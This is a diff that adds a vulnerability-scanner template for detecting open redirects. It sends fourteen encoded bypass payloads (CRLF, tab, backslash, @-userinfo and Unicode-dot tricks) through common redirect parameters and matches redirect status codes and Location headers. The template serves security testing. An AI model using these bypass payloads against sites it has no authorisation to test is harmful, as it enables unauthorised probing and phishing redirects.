@@ -1,0 +1,47 @@
+id: openredirect-mainpathwithparameters-bypasses  
+
+info:
+  name: Open Redirect Fuzz
+  author: osamahamad
+  severity: low
+  description: https://www.cyberick.com/post/open-redirect-and-its-bypasses + https://github.com/lutfumertceylan/top25-parameter
+  tags: redirect
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?{{openredirectParameters}}={{BaseURL}}@example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}={{BaseURL}}%09.example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}={{BaseURL}}%3F.example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}={{BaseURL}}%2523.example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=http://example.com?c=.{{Hostname}}"
+      - "{{BaseURL}}/?{{openredirectParameters}}={{BaseURL}}%252Eexample.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=//{{Hostname}}@example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=//%2F/example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=/%0D/example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=/\\/example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=/%5Cexample.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=//evil%E3%80%82com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=%09http:///example.coc%40example.com"
+      - "{{BaseURL}}/?{{openredirectParameters}}=%0D%0A/example.com"
+
+    stop-at-first-match: true
+    payloads:
+      openredirectParameters: payloads/openredirect-params.txt
+    
+    threads: 50
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$' # https://regex101.com/r/ZDYhFh/1
+
+      - type: status
+        status:
+          - 301
+          - 302
+          - 307
+          - 308
+        condition: or
